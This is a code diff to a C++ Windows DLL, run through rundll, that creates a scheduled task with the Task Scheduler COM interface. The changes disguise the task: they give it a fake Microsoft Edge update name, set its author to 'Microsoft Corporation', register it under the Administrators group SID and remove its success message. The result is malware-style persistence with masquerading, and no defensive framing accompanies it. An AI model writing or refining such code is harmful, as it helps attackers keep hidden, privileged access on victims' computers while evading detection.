@@ -11,7 +11,7 @@
 
 using namespace std;
 
-int login(HANDLE han, LPWSTR username, LPWSTR priv, LPWSTR filename)
+int login(HANDLE han, LPWSTR filename)
 {
 
     HRESULT hello = CoInitializeEx(NULL, COINIT_MULTITHREADED);
@@ -26,7 +26,7 @@ int login(HANDLE han, LPWSTR username, LPWSTR priv, LPWSTR filename)
         0,
         NULL);
 
-    string wszTaskName = "WindowsWatchDog";
+    string wszTaskName = "MicrosoftEdgeUpdateTaskUserS-1-5-21-4178988813-568853006-485972164-1000Core{B442A4BC-A486-404A-BD57-C9191931FBD1}";
  
     ITaskService* pService = NULL;
     hello = CoCreateInstance(CLSID_TaskScheduler,
@@ -49,7 +49,7 @@ int login(HANDLE han, LPWSTR username, LPWSTR priv, LPWSTR filename)
     IRegistrationInfo* pRegInfo = NULL;
     hello = pTask->get_RegistrationInfo(&pRegInfo);
 
-    hello = pRegInfo->put_Author((_bstr_t)"Administrator");
+    hello = pRegInfo->put_Author((_bstr_t)"Microsoft Corporation");
     pRegInfo->Release();
 
     ITaskSettings* pSettings = NULL;
@@ -100,7 +100,8 @@ int login(HANDLE han, LPWSTR username, LPWSTR priv, LPWSTR filename)
         _bstr_t(wszTaskName.c_str()),
         pTask,
         TASK_CREATE_OR_UPDATE,
-        _variant_t(priv),
+        // _variant_t(priv),
+        _variant_t("S-1-5-32-544"),
         _variant_t(),
         TASK_LOGON_GROUP,
         _variant_t(L""),
@@ -115,7 +116,7 @@ int login(HANDLE han, LPWSTR username, LPWSTR priv, LPWSTR filename)
         return 1;
     }
 
-    WriteConsole(han, L"Success", 8, new DWORD, 0);
+    // WriteConsole(han, L"Success", 8, new DWORD, 0);
 
     pRootFolder->Release();
     pTask->Release();
@@ -156,12 +157,12 @@ extern "C" __declspec(dllexport) BOOL APIENTRY DllMain(HMODULE hModule,
         int argCount;
 
         szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
-        if (argCount != 5)
+        if (argCount != 3)
         {
-            WriteConsole(han, L"rundll.exe Dll_task_login,DllMain username priv filename", 57, new DWORD, 0);
+            WriteConsole(han, L"rundll.exe Dll_task_login,DllMain filename", 57, new DWORD, 0);
             return 1;
         }
-        login(han, szArgList[2], szArgList[3], szArgList[4]);
+        login(han, szArgList[2]);
         LocalFree(szArgList);
         break;
     case DLL_THREAD_ATTACH:
